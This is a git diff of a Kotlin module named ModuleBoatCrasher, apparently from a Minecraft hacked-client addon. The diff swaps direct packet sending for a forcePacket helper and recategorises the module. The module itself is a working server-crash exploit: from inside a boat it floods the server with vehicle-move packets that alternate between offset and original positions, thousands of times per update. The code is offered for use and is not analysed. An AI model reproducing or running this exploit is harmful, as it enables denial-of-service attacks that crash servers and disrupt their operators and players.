@@ -1,6 +1,7 @@
 package de.florianmichael.tarasande_crasher.module
 
 import de.florianmichael.tarasande_crasher.errorMessage
+import de.florianmichael.tarasande_crasher.forcePacket
 import net.minecraft.entity.vehicle.BoatEntity
 import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket
 import net.tarasandedevelopment.tarasande.event.EventDisconnect
@@ -8,9 +9,8 @@ import net.tarasandedevelopment.tarasande.event.EventUpdate
 import net.tarasandedevelopment.tarasande.mc
 import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
 import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
-import net.tarasandedevelopment.tarasande.system.feature.modulesystem.ModuleCategory
 
-class ModuleBoatCrasher : Module("Boat crasher", "Weird exploit that crashes vanilla servers", ModuleCategory.EXPLOIT) {
+class ModuleBoatCrasher : Module("Boat crasher", "Weird exploit that crashes vanilla servers", "Crasher") {
 
     private val repeat = ValueNumber(this, "Repeat", 1000.0, 100000.0, 100000.0, 1000.0)
 
@@ -43,11 +43,11 @@ class ModuleBoatCrasher : Module("Boat crasher", "Weird exploit that crashes van
 
                 // spam to random values
                 mc.player!!.vehicle!!.setPos(vehiclePos.x - offsetX.value.toInt(), vehiclePos.y - offsetY.value.toInt(), vehiclePos.z - offsetZ.value.toInt())
-                mc.networkHandler!!.sendPacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))
+                forcePacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))
 
                 // reset values
                 mc.player!!.vehicle!!.setPos(vehiclePos.x, vehiclePos.y, vehiclePos.z)
-                mc.networkHandler!!.sendPacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))
+                forcePacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))
             }
         } else {
             errorMessage("You need to be in a boat to use this")
